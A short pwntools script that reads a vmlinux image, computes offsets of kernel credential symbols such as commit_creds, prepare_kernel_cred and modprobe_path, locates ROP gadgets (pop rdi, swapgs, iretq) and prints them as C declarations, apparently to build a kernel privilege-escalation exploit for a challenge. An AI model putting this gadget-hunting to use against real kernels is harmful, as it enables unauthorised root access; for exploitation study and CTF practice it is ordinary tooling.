from pwn import *

context.update( os = 'linux', arch = 'amd64',timeout = 1)
elf = ELF('./vmlinux')

offset = 0xffffffff81000000

modprobe_path = elf.sym['modprobe_path'] - offset
commit_creds = elf.sym['commit_creds'] - offset
init_cred = elf.sym['init_cred'] - offset
prepare_kernel_cred = elf.sym['prepare_kernel_cred'] - offset
__ksymtab_commit_creds = elf.sym['__ksymtab_commit_creds'] - offset
__ksymtab_prepare_kernel_cred = elf.sym['__ksymtab_prepare_kernel_cred'] - offset
swapgs_restore_regs_and_return_to_usermode = elf.sym['swapgs_restore_regs_and_return_to_usermode'] - offset
pop_rdi_ret = elf.search(asm("pop rdi;ret")).next()- offset
pop_rdi_ret = elf.search(asm("pop rdi;ret")).next()- offset
pop_rdx_ret = elf.search(asm("pop rdx;ret")).next()- offset
pop_rcx_ret = elf.search(asm("pop rcx;ret")).next()- offset
pop_rbp_ret = elf.search(asm("pop rbp;ret")).next()- offset
# mov_rdi_rax_x_ret = elf.search(asm("mov rdi, rax ; jne 0xffffffff8166fe73 ; pop rbx ; pop rbp ; ret")).next()- offset


# mov_rdi_rax_jmp_rcx = elf.search(asm("mov rdi, rax; jmp rcx;")).next()- offset
# mov_rdi_rax_jmp_rdx = elf.search(asm("mov rdi, rax; jmp rdx;")).next()- offset
# mov_rdi_rax_call_rdx = elf.search(asm("mov rdi, rax;call rdx")).next()- offset
# mov_rdi_rax_x_ret = elf.search(asm("mov rdi, rax; mov qword ptr [rdi], 1; ret;")).next() - offset
# mov_rdi_rax_y_ret = elf.search(asm("mov rdi, rax ; rep movsq qword ptr [rdi], qword ptr [rsi] ; ret")).next() - offset


# swapgs_popfq_ret  = elf.search(asm("swapgs; popfq; ret")).next()- offset
swapgs_pop_rbp_ret = elf.search(asm("swapgs ; pop rbp ; ret")).next()- offset
# iretq_ret = elf.search(asm("iretq; ret;")).next()- offset
iretq_ret = elf.search(asm("iretq;")).next()- offset

print("size_t commit_creds = " +  hex(commit_creds) + ";")
print("size_t prepare_kernel_cred = " +   hex(prepare_kernel_cred) + ";")
print("size_t pop_rdi_ret = " +   hex(pop_rdi_ret) + ";")
print( "size_t pop_rdx_ret = " +  hex(pop_rdx_ret) + ";")
print("size_t pop_rcx_ret = " +   hex(pop_rcx_ret) + ";")
print("size_t pop_rbp_ret = " +   hex(pop_rbp_ret) + ";")
print("size_t init_cred = " +   hex(init_cred) + ";")
# print("size_t mov_rdi_rax_jmp_rcx = " +   hex(mov_rdi_rax_jmp_rcx) + ";")
# print("size_t mov_rdi_rax_jmp_rdx = " +   hex(mov_rdi_rax_jmp_rdx) + ";")
# print("size_t mov_rdi_rax_x_ret = " +   hex(mov_rdi_rax_x_ret) + ";")
# print("size_t mov_rdi_rax_y_ret = " +   hex(mov_rdi_rax_y_ret) + ";")

# print("size_t mov_rdi_rax_call_rdx = " +   hex(mov_rdi_rax_call_rdx) + ";")
# print( "size_t swapgs_popfq_ret = " +  hex(swapgs_popfq_ret) + ";")
print( "size_t swapgs_pop_rbp_ret = " +  hex(swapgs_pop_rbp_ret) + ";")
print("size_t iretq_ret = " +   hex(iretq_ret) + ";")
print( "size_t __ksymtab_commit_creds = " +  hex(__ksymtab_commit_creds) + ";")
print("size_t __ksymtab_prepare_kernel_cred = " +   hex(__ksymtab_prepare_kernel_cred) + ";")
print("size_t swapgs_restore_regs_and_return_to_usermode = " +   hex(swapgs_restore_regs_and_return_to_usermode) + ";")
print("size_t modprobe_path = " +   hex(modprobe_path) + ";")

